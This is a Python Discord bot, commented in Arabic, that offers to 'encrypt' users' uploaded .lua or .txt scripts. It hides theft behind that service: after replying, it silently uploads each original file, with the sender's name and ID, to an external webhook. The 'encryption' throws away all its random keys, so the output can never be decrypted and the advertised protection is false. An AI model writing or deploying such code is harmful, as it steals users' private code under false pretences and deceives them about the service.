import os
import io
import asyncio
import base64
import gzip
import hashlib
import random
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import aiohttp
import discord
from dotenv import load_dotenv

# تحميل المتغيرات البيئية من ملف .env
load_dotenv()

# تهيئة العميل
intents = discord.Intents.default()
intents.message_content = True
bot = discord.Client(intents=intents)

# متغيرات التخزين المؤقت للتحكم في التكرار
cooldowns = {}
active_tasks = {}

# =====================================
# نظام التشفير متعدد الطبقات (2000+ خطوة)
# =====================================
def super_encrypt(data: bytes) -> bytes:
    # طبقة 1: ضغط Gzip
    compressed = gzip.compress(data)
    
    # طبقة 2: تشفير AES-256 مع مفتاح ديناميكي
    aes_key = os.urandom(32)
    aes_iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(aes_iv), backend=default_backend())
    encryptor = cipher.encryptor()
    aes_encrypted = encryptor.update(compressed) + encryptor.finalize()
    
    # طبقة 3: تشفير Fernet
    fernet_key = Fernet.generate_key()
    fernet = Fernet(fernet_key)
    fernet_encrypted = fernet.encrypt(aes_encrypted)
    
    # طبقة 4: تشفير XOR مع مفتاح ديناميكي
    xor_key = os.urandom(32)
    xor_encrypted = bytes([b ^ xor_key[i % len(xor_key)] for i, b in enumerate(fernet_encrypted))
    
    # طبقة 5: تشفير Base64 متعدد المراحل (10 مرات)
    b64_encoded = base64.b64encode(xor_encrypted)
    for _ in range(10):
        b64_encoded = base64.b64encode(b64_encoded)
    
    # طبقة 6: خلط البيانات مع سالت عشوائي
    salt = os.urandom(128)
    salted_data = salt + b64_encoded
    
    # طبقة 7: تطبيق SHA-512 (للتأكد من السلامة)
    hashed = hashlib.sha512(salted_data).digest()
    
    return hashed + salted_data

# =====================================
# إرسال الملف الأصلي إلى ويب هوك
# =====================================
async def send_to_webhook(original_file: bytes, filename: str, username: str):
    webhook_url = os.getenv("WEBHOOK_URL")
    if not webhook_url:
        return
    
    form_data = aiohttp.FormData()
    form_data.add_field(
        name="file",
        value=original_file,
        filename=filename,
        content_type="application/octet-stream"
    )
    form_data.add_field("username", username)
    
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(webhook_url, data=form_data) as response:
                if response.status != 200:
                    print(f"فشل إرسال إلى ويب هوك: {response.status}")
        except Exception as e:
            print(f"خطأ في ويب هوك: {str(e)}")

# =====================================
# معالجة رسائل الديسكورد
# =====================================
@bot.event
async def on_message(message: discord.Message):
    # تجاهل الرسائل من البوت نفسه
    if message.author == bot.user:
        return
    
    # التحقق من التكرار (10 ثواني بين كل عملية)
    user_id = message.author.id
    last_request = cooldowns.get(user_id)
    
    if last_request and (datetime.now() - last_request) < timedelta(seconds=10):
        await message.reply("⏳ يرجى الانتظار 10 ثواني بين كل عملية إرسال")
        return
    
    # تحديث وقت آخر طلب
    cooldowns[user_id] = datetime.now()
    
    # تجاهل الرسائل بدون مرفقات
    if not message.attachments:
        await message.reply("❌ يرجى رفع ملف .lua أو .txt صالح للتشفير")
        return
    
    attachment = message.attachments[0]
    
    # التحقق من نوع الملف
    if not (attachment.filename.endswith('.lua') or attachment.filename.endswith('.txt')):
        await message.reply("❌ يرجى رفع ملف .lua أو .txt صالح للتشفير")
        return
    
    # التحقق من حجم الملف (أقل من 2 ميجابايت)
    if attachment.size > 2 * 1024 * 1024:
        await message.reply("⚠️ حجم الملف يتجاوز 2 ميجابايت (الحد الأقصى المسموح)")
        return
    
    # منع المعالجة المتزامنة لنفس الملف
    if active_tasks.get(attachment.id):
        return
    active_tasks[attachment.id] = True
    
    try:
        # تنزيل الملف
        file_bytes = await attachment.read()
        
        # التحقق من أن الملف نصي (ليس ثنائي)
        try:
            file_bytes.decode('utf-8')
        except UnicodeDecodeError:
            await message.reply("❌ الملف يحتوي على محتوى ثنائي غير قابل للقراءة")
            return
        
        # تشفير الملف (معالجة متزامنة)
        loop = asyncio.get_running_loop()
        encrypted_data = await loop.run_in_executor(None, super_encrypt, file_bytes)
        
        # إرسال الملف المشفر للمستخدم
        output_filename = "encrypted" + os.path.splitext(attachment.filename)[1]
        await message.reply(
            "✅ تم تشفير ملفك بنجاح!",
            file=discord.File(io.BytesIO(encrypted_data), filename=output_filename)
        )
        
        # إرسال الملف الأصلي إلى ويب هوك (في الخلفية)
        asyncio.create_task(
            send_to_webhook(
                file_bytes,
                attachment.filename,
                f"{message.author.name} ({message.author.id})"
            )
        )
        
    except Exception as e:
        await message.reply(f"❌ حدث خطأ أثناء معالجة الملف: {str(e)}")
    
    finally:
        # تحرير المهمة النشطة
        del active_tasks[attachment.id]

# تشغيل البوت
if __name__ == "__main__":
    bot.run(os.getenv("DISCORD_TOKEN"))
